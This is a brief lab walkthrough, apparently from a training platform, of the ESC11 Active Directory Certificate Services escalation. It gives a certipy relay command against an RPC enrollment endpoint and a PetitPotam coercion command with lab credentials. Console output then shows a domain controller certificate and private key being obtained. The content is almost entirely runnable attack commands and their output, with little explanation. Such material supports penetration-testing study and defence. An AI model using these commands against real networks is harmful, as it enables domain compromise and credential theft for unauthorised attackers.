# ESC11

`ESC11` domain escalation is similar to `ESC8`; instead of requesting certificates via the `HTTP` web enrollment endpoints, `RPC`/`ICRP` enrollment endpoints are utilized.

### <mark style="color:yellow;">ESC11 Abuse</mark>

Start listening

```sh
sudo certipy relay -target "rpc://172.16.19.5" -ca "lab-WS01-CA" -template DomainController
```

Coerce with PetitPotam

```sh
python3 PetitPotam.py -u BlWasp -p 'Password123!' -d 'lab.local' 172.16.19.19 172.16.19.3
```

```sh
htb-student@ubuntu:~$ sudo certipy relay -target "rpc://172.16.19.5" -ca "lab-WS01-CA" -template DomainController
[sudo] password for htb-student: 
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Targeting rpc://172.16.19.5 (ESC11)
[*] Listening on 0.0.0.0:445
[*] Connecting to ncacn_ip_tcp:172.16.19.5[135] to determine ICPR stringbinding
[*] Attacking user 'LAB-DC$@DC'
[*] Requesting certificate for user 'LAB-DC$' with template 'DomainController'
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 15
[*] Got certificate with DNS Host Name 'lab-dc.lab.local'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'lab-dc.pfx'
[*] Exiting...

```

